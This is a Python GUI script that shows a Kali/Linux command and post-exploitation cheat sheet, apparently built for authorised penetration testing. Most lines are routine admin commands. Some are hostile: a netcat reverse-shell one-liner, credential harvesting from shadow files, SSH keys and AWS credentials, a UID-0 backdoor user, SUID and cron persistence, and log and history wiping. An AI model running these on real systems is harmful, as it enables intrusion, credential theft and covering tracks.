#!/usr/bin/env python3

from tkinter import *
import subprocess

#Define variables outside functions here:

info = r'''

     ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗    ██╗███╗   ██╗███████╗ ██████╗
     ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝    ██║████╗  ██║██╔════╝██╔═══██╗
     ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝     ██║██╔██╗ ██║█████╗  ██║   ██║
     ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗     ██║██║╚██╗██║██╔══╝  ██║   ██║
     ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗    ██║██║ ╚████║██║     ╚██████╔╝
     ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝

##################################################################################

info_linux  -  Kali / Linux command, filesystem and post-exploitation reference

A working cheat-sheet for operating on Linux during a cyberworthiness assessment,
from both ends: running your Kali attack box (packages, services, networking,
local servers) and living on a compromised Linux host (filesystem layout,
permission / SUID / capability hunting, credential locations, log files, text
processing with awk/sed/cut/sort/grep/xxd, tunnelling, and clean-up notes).

when to reach for it
    - you just landed a shell on Linux and need the standard enumeration / privesc checks
    - you need the exact syntax for find-perm, awk field extraction, ssh port-forwarding, etc.
    - setting up the Kali side: web server, SSH, VNC, Docker, networking
    - most common use: the "Find files", "Password look up" and SUID/capability sections
      below, right after getting a foothold

pair with
    exploit_linpeas / exploit_pspy / exploit_linux_suggester   automate what this lists
    exploit_tty_upgrade    the PTY-upgrade one-liners in expanded form
    info_grep / web_recon_notes   more text-processing recipes
    GTFOBins (link below)  turn a SUID/sudo binary into a root shell

gotchas
    - GNU vs BusyBox / macOS: cut-down coreutils on Alpine, containers and appliances
      drop flags this sheet assumes (find -printf, awk gensub, sed -i) - check with --version
    - a raw shell has no job control, tab-complete or history - upgrade the PTY
      (exploit_tty_upgrade) before running anything interactive
    - find / linpeas across a big or NFS-mounted tree is slow and noisy in logs and IDS;
      scope with -xdev / -maxdepth and expect to be seen
    - $PATH and env are minimal under many shells - use absolute paths and don't trust
      that a tool you "know is installed" is reachable
    - your history is being written too: unset HISTFILE / prepend a space, and remember
      any file you drop in /tmp or /dev/shm is evidence to clean up
    - SUID/capability findings need the binary to actually be exploitable in this
      version - verify against GTFOBins, don't just report the bit

living off the land
https://lolbas-project.github.io/          #Windows signed-binary abuse
https://gtfobins.github.io/                #Unix binary abuse (SUID / sudo / capabilities)

authorisation & reporting
    - enumeration here is passive; anything that adds users, cron jobs, SUID copies or
      edits logs is intrusive and persistence - authorised scope only, and record it
    - report: SUID/sudo/capability privesc paths, world-writable configs/cron, secrets
      in histories / SSH keys / cloud creds, weak file permissions
    - fix = least-privilege sudoers, drop needless SUID/capabilities, correct file
      ACLs, remove secrets from disk/history, auditd + centralised logging

kali-undercover  #xfrc GUI

ctrl + A #start
ctrl + E #end
ctrl + U #delete all before selector/curser
ctrl + K #delete all after selector/curser
ctrl + Y #return deleted to where selector/curser
ctrl + C #end current task/process
ctrl + L #clear terminal
ctrl + R #search command history
ctrl + +/- #zoom
ctrl + shift + C #copy
ctrl + shift + V #paste
ctrl + shift + '+' #zoomin
ctrl + shift + '-' #zoomout
ctrl + shift + T  #new terminal tab

~.bashrc   #files to set alias EX #alias ll='ls -lh'
~.zshrc

terminator  #split terminal

GtkHash - quick GUI hasher

##################################################################################

sudo apt list --upgradable
sudo apt update && apt dist-upgrade  #basic update
sudo apt update
sudo apt dist-upgrade -y
sudo apt update && sudo apt -y full-upgrade #full update
sudo update-grub #restore boot loader

sudo dpkg -i --force-overwrite /var/cache/apt/archives/...deb  #use tab
sudo apt -f install

sudo nano /etc/apt/source.list  #enable both sources
sudo apt install kali-desktop-gnome  #install GUI
sudo init 6  #restart
sudo apt autoremove  #clean up
apt list --installed  #list installed packages
sudo apt install application_name -y  #install missing packages
sudo apt install openssh-server -y  #install ssh server
/etc/ssh/sshd_config  #config file for ssh
systemctl start ssh.socket
systemctl status ssh.socket
sudo apt install openvpn -y  #install openvpn
/etc/openvpn/server.conf  #config file for openvpn
git clone https://github.com/application_name  #copy from github page

apt install apache2 -y  #install webserver
curl http://localhost  #get website source code
wget http://localhost  #download source code
python3 -m http.server  #start python local server
http-server -p 8080  #npm local server
php -S 127.0.0.1:8080  #php local server

systemctl start service_name  #start service/process
systemctl status service_name  #display status
systemctl enable service_name  #set pservice to start after start up
systemctl list-units --type=service  #list all services
systemctl show service_name -p Type  #show  service type

##################################################################################

System stracture

Executable programs are stored in /bin and /sbin.
/root 	 is the root login account's home directory. This is hugely important because if you log in directly as root, this will be your initial location in the directory structure. If you log in as an individual user other than root, you'll be put in that user's directory, typically somewhere inside of /home.
/dev 	 stores devices (drives, terminals, etc.).
/etc 	 holds configuration items, like the account information (stored in /etc/passwd) and hashed passwords (stored in /etc/shadow).
/home 	 contains users' home directories.
/lib	 contains common libraries.
/mnt 	 is where various remote and temporary file systems (CD-ROMs, floppies, etc.) are attached.
/proc 	 is a virtual file system used to store kernel info.
/tmp 	 is for temporary data and is usually cleared at reboot.
/usr 	 holds user programs and other data.
/var 	 holds many different items, including logs (/var/log/).
/opt 	 stores optional items and is often a location for specialized tools that have been added to a distribution.

/bin/: basic programs
/boot/: Linux kernel and other files required for its early boot process
/dev/: device files
/etc/: configuration files
/home/: user's personal files
/lib/: basic libraries
/media/: mount points for removable devices (CD/DVD-ROM, USB keys, and so on)
/mnt/ or /mount/: temporary mount point
/opt/: extra applications provided by third parties
/root/: administrator's (root's) personal files
/run/: volatile runtime data that does not persist across reboots (not yet included in the FHS)
/sbin/: system programs
/srv/: data used by servers hosted on this system
/tmp/: temporary files (this directory is often emptied at boot)
/usr/: applications (this directory is further subdivided into bin, sbin, lib according to the same logic as in the root directory) Furthermore, /usr/share/ contains architecture-independent data. The /usr/local/ directory is meant to be used by the administrator for installing applications manually without overwriting files handled by the packaging system (dpkg).
/var/: variable data handled by services. This includes log files, queues, spools, and caches.
/proc/ and /sys/ are specific to the Linux kernel (and not part of the FHS). They are used by the kernel for exporting data to user space.

sudo fdisk -l  #list partitions
/etc/fstab  #default file systems mounted at boot
mount  #list mounted drives
sudo mount /dev/usb_name /mnt/usb  #mount usb
sudo umount /mnt/usb  #unmount usb
sudo mount-shared-folders  #automatically reinstall and bind the mount hooks
lsof  #list open files

##################################################################################

dpkg -l  #list all installed software
tree .  #will show all directories
uname -r #kernel version
uname -a #will give OS on linux
who  #displays who is logged in
whoami  #get your username
whois domain.com  #get info about domain
id  #uid,gid,groups
hostname  #sets or prints the name of current host system
host domain.com  #return ip address
sudo -i  #get root shell
su -  #get root shell and env variables
sudo su -  #change to root
sudo  #execute command as a different user
env  #prints environment or sets and executes command
sudo -l -l  #list allowed sudo commands
sudo -l #if -l -l dosent work
	sudo -u new_user /bin/bash  #change user from sudo -l
	sudo /usr/bin/python3 -c "import pty; pty.spawn('/bin/bash')"
	#will spawn shell through python
find / -perm -u=s  #look for executable that runs with owner privilage
find / -uid 0 -perm -4000 -print 2>/dev/null  #find files executed by root
useradd -o -u 0 user_name  #create account with uid 0, root. -o override unique UID
cut -d: -f3 /etc/passwd | sort -n | uniq -c  #find UID doubles
dmesg | grep promisc  |search for packet sniffer
ip link set eth0 promisc on/off  #change promisc mode

useradd  #creates a new user or update default new user information.
userdel  #deletes a user account and related files
usermod  #modifies a user account
addgroup  #adds a group to the system
delgroup  #removes a group from the system
passwd  #changes user password

mkdir directory  #create a directory -p will add parent directories
pwd  #returns working directory name
cp file1 file2  #copy
rm file  #to delete a directory, use the -rf (recursive, force) flags
mv obj1 obj2  #move a file or directory (also for renaming)
grep somestring [file]  #search through output for somestring in output or file or | grep string
echo sometext  #display a line of text
touch  #create or update last modified date of the file
ps -aux  #list processes
ps -aux | grep root   #process running as root
ps -eo pid,lstart,cmd #check time process started
kill -l  #list kill options
	1	SIGHUP - This is sent to a process when the terminal that controls it is closed
	2	SIGINT - Sent when a user presses [Ctrl] + C in the controlling terminal to interrupt a process
	3	SIGQUIT - Sent when a user presses [Ctrl] + D to quit
	9	SIGKILL - Immediately kill a process with no clean-up operations
	15	SIGTERM - Program termination
	19	SIGSTOP - Stop the program. It cannot be handled anymore
	20	SIGTSTP - Sent when a user presses [Ctrl] + Z to request for a service to suspend
kill 9 <PID>  #immediately kill process
killall 9 process_name  #kill all processes with selected name
bg  #put process in background or add & at the end of command
jobs  #list background processes
fg 1 #bring background process 1 forward
lsof  #list open files
lsof -Pni  #show connections. -P numeric ports. -n IP address instead of name. -i network
lsof -p PID  #gives information about open files and ports for selected PID
lsof +L1  #processes running that been unlinked from binary
man command  #look at the manual (help) for a command
man -k string  #search man page for string
whatis command  #info what command does
apropos string  #search for string topics
--help  #help options, sometimes -h
ls -lah
	- rwx rw- r--   1 root root 1641 May  4 23:42 /etc/passwd
	- --- --- ---   |  |    |    |   |__________|
	|  |   |   |    |  |    |    |        |_ Date
	|  |   |   |    |  |    |    |__________ File Size
	|  |   |   |    |  |    |_______________ Group
	|  |   |   |    |  |____________________ User
	|  |   |   |    |_______________________ Number of hard links
	|  |   |   |_ Permission of others (read)
	|  |   |_____ Permissions of the group (read, write)
	|  |_________ Permissions of the owner (read, write, execute)
	|____________ File type (- = File, d = Directory, l = Link, ... )

chmod  #u - owner, g - Group, o - others, a - All users, use + or -
	Binary Notation:				4 2 1  |  4 2 1  |  4 2 1
					                r w x     r w x     r w x
7 = 4 + 2 + 1 = read, write, and execute
6 = 4 + 2 = read and write
5 = 4 + 1 = read and execute
3 = 2 + 1 = write and execute

chown <user>:<group> <file/directory>  #changed owner and group
clear  #clear screen or Ctrl + L
history  #show previous commands
wich  #return full path to file

nano  #file reader/editer
gedit  #file editer
vi  #search replace :%s/.*/+ '$': /  #%s/.*/ "every line replace" $ "original line"
	+ bullet list
	`text` fixed font
	# header h1 bold
	## header h2 bold
	### header h3 bold
	**text**  BOLD
	esc followed by :wq  #save and quit

tee  #print to file and STDOUT
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f' | tee -a file.sh
	-a, --append	append to the given FILEs, do not overwrite

cat filename  #show the contents of a file

cat << EOF > /path/list.txt   #creates list text file
> something
> something2
> something3
> something4
> something5
> EOF   #stop

cat > file.txt
paste/write any text in to terminal
Ctrl + D  #to finish

more filename or less filename  #used for large texts, [Q] key to exit
head filename  #show the first 10 lines of a file, use -n X to specify the number lines
tail filename  #show the last 10 lines of a file, use -n X to specify the number lines

wc -l  #word count
tr [character to replace] [replace with]  #replaces characters
column -t  #separate in columns

shutdown -h now  #halt and shut down
shutdown -r now  #reboot now
shutdown -r +10M  #reboot in 10 min

echo "base64_text" | base64 -d | iconv -f UTF-16LE -t UTF-8  #decode base64

##################################################################################

sudo cat /etc/sudoers additional privilege configurations
/proc/meminfo #all memory data
/proc/version #version
/etc/shadow #hashes
/etc/passwd #users/accounts
cat /etc/passwd | cut -d : -f 1 > users.txt #file only with usernames
/etc/group #groups
/home/username/.ssh/ #ssh user private key
/etc/hosts  #dns resolution
/etc/hosts.allow  #list allowed services and hosts
/etc/hosts.deny  #list denied services and hosts
/var/log/kern.log  #kernel logs
/var/log/syslog  #system logs
/var/log/auth.log  #user authentication logs
/var/log/daemon.log  #background process events
/var/log/cron.log  #events related to scheduled tasks
/var/log/secure  #events related to su or sudo access
/var/log/apache2/error.log  #application logs
/var/log/mysql/error.log  #application logs

##################################################################################

Password look up:

ps -efw  #list arguments to programs
last -f /var/log/btmp  #log in prompt
cat /home/*/.*history  #shell history
grep -iR password /var/www  #search web files
cat /home/*/.ssh/id*  #ssh keys
cat /home/*/.mysql_history  #history files
cat /home/*/.aws/credentials  #AWS cloud

MAC clipboard lookup:

x=""; while true; do y=`pbpaste`; if [ "$x" != "$y" ] ; then echo $y; x=$y; fi; done

##################################################################################

Find files:

sudo updatedb  #update file database
locate *.conf  #search through file database

find / -uid 0 -type f -perm -4000 2>/dev/null  #find root with SETUID bit set

find / -perm -4000 -ls 2>/dev/null  #look for executable that can be written over it

find /etc -perm -2  #find writable files
	#RWX permissions r=4, w=2, x=1

find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2>/dev/null
	#backslash escapes the next character from being interpreted by the shell
	#2>/dev/null  redirect errors

SETUID and/or SETGID files
$ find / -perm -4000 -o -perm -2000 -ls 2>/dev/null

Writable configuration files
$ find /etc -perm -2

Readable bash history files
$ find /home -name .bash_history -perm -4 2>/dev/null

##################################################################################

ifconfig  #network config
ip address show / ip a / ip addr  #network config
sudo ifconfig eth0 up  #activate network interface
sudo ip link set eth0 up  #activate network interface
sudo ifconfig eth0 10.10.10.10  #assign IP
eth0 netmask 255.255.255.0  #assign netmask
sudo route add default gw 10.10.10.1 eth0  #assign gateway

/etc/resolv.conf  #DNS config file
/etc/network/interfaces  #config interfaces
	auto eth0
	iface eth0 inet static
	  address 10.10.10.2
	  netmask 255.255.255.0
	  gateway 10.10.10.1
	  dns-nameservers 8.8.8.8 8.8.4.4

sudo systemctl restart networking  #restart networking service
service networking restart  #restart networking
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT  #manage firewall, opens port 22

ping <remote_host>  #test connection

ping scan:
$ for i in $(sec 254); do ping 10.10.10.${i} -c1 -W1 & done | grep from  #quick ping loop looking for reply

traceroute www.inlanefreight.com  #return IP addresses per hop

netstat -nap  #show connections. -n numeric ports. -a listening and established. -p show PID
netstat -rn  #show networks accessible via the VPN/route

Check TCP/UDP connections history
netstat -natu  #all TCP and UDP

ss -t state established #displays a list of open non-listening sockets
arp -a
ip n

capinfos file.pcap  #give basic info about pcap

nc port scanner:
nc -vvv IP_address -z -w3 Port-numbers

egrep -i 'CLOSE|ESTABLISHED|Offset'  #filter for connections

##################################################################################

Root shell persistance:  #/tmp is deleted on restart!!!
cp /bin/sh /tmp/rootpriv  #try -p or -a to preserve owner
sudo chown root:root /tmp/rootpriv  #change owner to root
chmod 4755 /tmp/rootpriv  #change to execute with original owner
/tmp/rootpriv -p  #execute us root, -p preserve permissions

add new scheduled tasks:  #write bash script with a reverse shell
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root

##################################################################################

systemctl start ssh.socket
systemctl status ssh.socket
systemctl stop ssh.socket
systemctl status ssh.socket

ssh:
     ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address]
         [-c cipher_spec] [-D [bind_address:]port] [-E log_file]
         [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file]
         [-J destination] [-L address] [-l login_name] [-m mac_spec]
         [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]
         [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination
         [command [argument ...]]

private ssh keys:
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa

ssh [username]@[IP address]

-i   #file with key
-----BEGIN RSA PRIVATE KEY-----
<paste private key here>
-----END RSA PRIVATE KEY-----

chmod 600 key.txt
ssh -i ./key.txt user@IP

Local port 8888 forwarded through the pivot system to an internal web server
attacker $ ssh -L 8888:target:80 user2@pivot #local

##################################################################################

AWK

awk '{print $3}' file.txt  #prints 3rd field

Print the length of each line of a file (/etc/passwd in this case), followed by the line itself:
	$ cat /etc/passwd | awk '{print length, $0;}'
Print the 2nd field from a file using the string 'Mozilla/' as a delimiter:
	$ cat /var/log/apache2/access.log | awk -F "Mozilla/" '{print $2}'
Print the last period delimited field
	$ cat domains.txt | awk -F "." '{print $(NF)}'
Read from file:
	$ awk '/search_string/ {print $1, $3, $5}' something.log
	$ TZ=time_zone awk '/search_string/ {print strftime("%T", $1), $3, $5}' something.log  #adjust log time to be human readable

##################################################################################

Checksum tools

Generate the MD5 checksum of a file:
	$ md5sum /etc/passwd
Generate the SHA1 checksum of a file. The three following commands are equivalent:
	$ sha1sum /etc/passwd
	$ shasum /etc/passwd
	$ shasum -a1 /etc/passwd
Generate the SHA-256 checksum of a file:
	$ shasum -a256 /etc/passwd
Generate the SHA-512 checksum of a file:
	$ shasum -a512 /etc/passwd

##################################################################################

CUT

Cut the 2nd field from a file, using the space as a delimiter:
	$ cat /var/log/dpkg.log | cut -d' ' -f2
Cut the 6th field from a file, using the colon as a delimiter:
	$ cat /etc/passwd | cut -d: -f6
Cut the 2nd and 3rd field from a file, use the comma as a delimiter:
	$ cat /labs/honeytokens/pilots.csv | cut -d, -f2-3
Cut beginning at the 7th field, to end of line, using the space as a delimiter:
	$ cat /var/log/dpkg.log | cut -d' ' -f3-
Cut the 6th field, using the double-quote (") as a delimiter, and escaping it to treat it as a literal character:
	$  cat  /var/log/apache2/access.log  | cut -d\\" -f6
Cut the beginning at the 11th character, to end of line:
	$ ifconfig | cut -c11-

##################################################################################

FILE

Determine the file type, using the file's magic bytes:
	$ file /usr/local/bin/*

##################################################################################

GREP

Search for lines containing the string "bash", case sensitive:
	$ grep bash /etc/passwd
Search for lines containing the string "bash", case insensitive:
	$ grep -i bash /etc/passwd
Search for lines that do not contain the string "bash", case insensitive:
	$ grep -vi bash /etc/passwd
Search for lines containing the string "root", case sensitive, plus print the next 5 lines:
	$ grep -A5 root /etc/passwd

##################################################################################

HEAD

Print first 10 lines of a file:
head -n 10 /etc/passwd

##################################################################################

SED

grep for lines containing "Mozilla", then change "Mozilla" to "MosaicKilla":
	$ grep Mozilla /var/log/apache2/access.log | sed "s/Mozilla/MosaicKilla/g"
grep for string and delete it:
	$ grep string data.txt | sed 's/string//' > newdata.txt
grep for lines containing "Mozilla", then delete all characters up to and including "Mozilla":
	$ grep Mozilla /var/log/apache2/access.log | sed "s/^.*Mozilla//g"
grep for lines containing "Mozilla", then delete all characters that precede "Mozilla":
	$ grep Mozilla /var/log/apache2/access.log | sed "s/^.*Mozilla/Mozilla/g"

grep domain.com credlist.txt | sed 's/@domain.com//' > userlist.txt  #delete @domain,com
                               sed 's/@.*//' > userlist.txt  #delete everything after @

##################################################################################

SORT

The following examples will run strings on a file, search for user-agent (ignore case), and use various sort options
Simple alphabetic sort (may include duplicates)
	$ strings /pcaps/fraudpack.pcap | grep -i user-agent | sort
Sort and unique lines. The two following sets of commands are equivalent:
	$ strings /pcaps/fraudpack.pcap | grep -i user-agent | sort -u
	$ strings /pcaps/fraudpack.pcap | grep -i user-agent | sort | uniq
Get a numeric count of each unique entry:
	$ strings /pcaps/fraudpack.pcap | grep -i user-agent | sort | uniq -c
Get a numeric count of each unique entry, perform a numeric sort of that count:
	$ strings /pcaps/fraudpack.pcap | grep -i user-agent | sort | uniq -c | sort -n
Sort and unique lines, print the length of each unique line followed by the line itself, perform a reverse numeric sort of that count:
	$ strings /pcaps/fraudpack.pcap | grep -i user-agent | sort -u | awk '{print length, $0}'| sort -rn
Sort on the the second comma separated field
	$ cat /bonus/alexa/top-1m.csv sort -t, -k2

##################################################################################

IP filter:
	$ for octet in 100 102 104 106; do tcpdump -tt -n -r file.pcap -c 1 "src host 10.10.10.$octet and dst port 80" 2>/dev/null; done  #run tcpdump output for all selected IP addresses

##################################################################################

WC

Determine number of lines in a file (the flag is the letter "ell", not the number one):
	$ wc -l /etc/passwd

##################################################################################

XXD

xxd creates a hexdump, or converts a hexdump into binary. A lot of malware hex-encodes web traffic or malicious payloads (such as DOS executables) in order to avoid signature matching. Useful hex patterns to look for are 4d5a90 (the magic bytes for a DOS executable: "MZ<90>"), and "DOS mode" (444f53206d6f6465, see commands below).
xxd cannot natively handle percent-encoded hex, such as "%63%67%69%2D%62%69%6E", but can if the percent signs are removed (see below).
Convert the string "DOS mode" to hex, grouped in sets of 4 hex characters (default):
	$ echo -n "DOS mode" | xxd
	0000000: 444f 5320 6d6f 6465                      DOS mode
Convert the string "DOS mode" to hex, ungrouped:
	$ echo -n "DOS mode" | xxd -g0
	0000000: 444f53206d6f6465                  DOS mode
Convert the hex string "444f53206d6f6465" to binary:
	$ echo 444f53206d6f6465 | xxd -r -p
	DOS mode
Use sed to remove the percent signs from the percent-encoded hex string "%63%67%69%2D%62%69%6E", then translate to binary:
	echo "%63%67%69%2D%62%69%6E" | sed "s/\%//g" | xxd -r -p
	cgi-bin

##################################################################################

Restart networking:
	$ sudo /etc/init.d/networking restart

##################################################################################

PASSWD

Change your password:
	$ passwd

##################################################################################

REGEX
	(a)	round brackets are used to group parts of a regex
	[a-z]	square brackets are used to define character classes
	{1,10}	curly brackets are used to define quantifiers, specify a number or a range that indicates how often a previous pattern should be repeated
	|	OR
	.*	AND

grep -E "(string1|string2)" filename   #use regex to find string1 OR string2 in a file
grep -E "(string1.*string2)" filename   #use regex to find string1 AND string2 in a file

##################################################################################

#Install Docker script

#!/bin/bash

# Preparation
sudo apt update -y
sudo apt install ca-certificates curl gnupg lsb-release -y
sudo mkdir -m 0755 -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# Install Docker Engine
sudo apt update -y
sudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y

# Add user student to the Docker group
sudo usermod -aG docker student
echo '[!] You need to log out and log back in for the group changes to take effect.'

# Test Docker installation
docker run hello-world

##################################################################################

#TigerVNC remote connection for linux

sudo apt install xfce4 xfce4-goodies tigervnc-standalone-server -y  #install server
vncpasswd  #set password
touch ~/.vnc/xstartup ~/.vnc/config  #create config file
cat <<EOT >> ~/.vnc/xstartup  #modify config file

#!/bin/bash
unset SESSION_MANAGER
unset DBUS_SESSION_BUS_ADDRESS
/usr/bin/startxfce4
[ -x /etc/vnc/xstartup ] && exec /etc/vnc/xstartup
[ -r $HOME/.Xresources ] && xrdb $HOME/.Xresources
x-window-manager &
EOT

htb-student@ubuntu:~$ cat <<EOT >> ~/.vnc/config  #modify config file

geometry=1920x1080
dpi=96
EOT

chmod +x ~/.vnc/xstartup  #add execute permission
vncserver  #start server
	Use xtigervncviewer -SecurityTypes VncAuth -passwd /home/htb-student/.vnc/passwd :1 to connect to the VNC server
vncserver -list  #list all sessions
	X DISPLAY #     RFB PORT #      PROCESS ID
	:1              5901            79746

ssh -L 5901:127.0.0.1:5901 -N -f -l user_name 10.10.10.10  #create tunnel and port forwarding
xtightvncviewer localhost:5901  #start GUI

##################################################################################

Hiding files in UNIX:
". " or ".. "  #. indicates hiden file, followed by space " "
"..." or " "

Common hiding locations:
/dev
/tmp/etc
/usr/local/man
/usr/src

Log files:  #these files can be deleted or eddited
/etc/syslog.conf
/var/log/auth.log
/var/log/syslog
/var/log/httpd/error_log
/var/log/httpd/access_log
...
last will decode log files
/var/run/utmp  #binary current logged-in users
/var/log/wtmp  #binary past user logins
/var/log/btmp  #binary fail login attempts
/var/log/lastlog  #binary last login
#remove.c can delete entries

Bash history:
$HOME/.bash_history
unset HISTFILE  #stop recording bash history
kill -9 bash  #stop current bash shell without saving logs
kill -9 $$  #stop current bash shell without saving logs
" ls"  #use space before commands

##################################################################################

modern linux enumeration, capabilities, systemd & containers
  linux capabilities
    getcap -r / 2>/dev/null                    find binaries with setuid / network capabilities
    capsh --print                              print current process capability set

  systemd timers & writable units
    systemctl list-timers --all                list all scheduled systemd timers
    find /etc/systemd /lib/systemd -writable 2>/dev/null    hunt writable service unit files

  acls & mount permissions
    getfacl -R /opt /srv 2>/dev/null           inspect POSIX file ACL entries
    cat /etc/exports                           check for no_root_squash NFS exports
    findmnt                                    verify nosuid and noexec mount options

  container & namespace detection
    ls -la /.dockerenv /run/.containerenv      detect container environments
    cat /proc/1/cgroup                         check control groups for docker/lxc/kubepods
    ls -l /var/run/docker.sock                 detect exposed docker daemon socket

  cloud instance metadata service (imds)
    aws imdsv2: TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
    azure:      curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

  modern ssh pivoting
    ssh -J user@jumpbox user@internal          ProxyJump multi-hop SSH connection
    ssh -D 1080 -N -f user@pivot               background dynamic SOCKS5 proxy
'''

#GUI

#Creates $guibox window to populate all the gui
guibox = Tk()
guibox.title('info_linux  —  generic Kali / Linux commands and structure')   #window title: tool name + purpose
guibox.geometry("950x900")   #size for the window guibox

#Define functions

def NEW_Terminal():
    subprocess.call(["gnome-terminal"])

#Grid Frames
frame_main = Frame(guibox)
frame_main.grid(row=0, column=0, columnspan=1, padx=5, pady=0, sticky="nsew")
guibox.rowconfigure(0, weight=1)
guibox.columnconfigure(0, weight=1)
frame_main.rowconfigure(1, weight=1)
frame_main.columnconfigure(0, weight=1)

frame_message = Frame(frame_main)
frame_message.grid(row=1, column=0, columnspan=1, padx=5, pady=5, sticky="nsew")

frame_buttons1 = Frame(frame_main)
frame_buttons1.grid(row=2, column=0, columnspan=8, padx=5, pady=5)

#interface
text_box = Text(   #creates text box inside frame_message with the info text
    frame_message,
    height=45,
    width=115
)
text_box.grid(row=1)

text_box.insert('end', info)   #adds info to the end of text_box
text_box.pack(side=LEFT, fill=BOTH, expand=True)   #config for slider variant
text_box.yview('1.0')

sb = Scrollbar(frame_message)   #assign scrollbar
sb.pack(side=RIGHT, fill=BOTH)   #scrollbar configuration

text_box.config(yscrollcommand=sb.set)   #set scrollbar on y axis
sb.config(command=text_box.yview)

NEW_button = Button(frame_buttons1, text=" NEW Terminal ", command=NEW_Terminal)
NEW_button.grid(row=2, column=0, padx=5, pady=5)

guibox.mainloop()   #generates guibox window
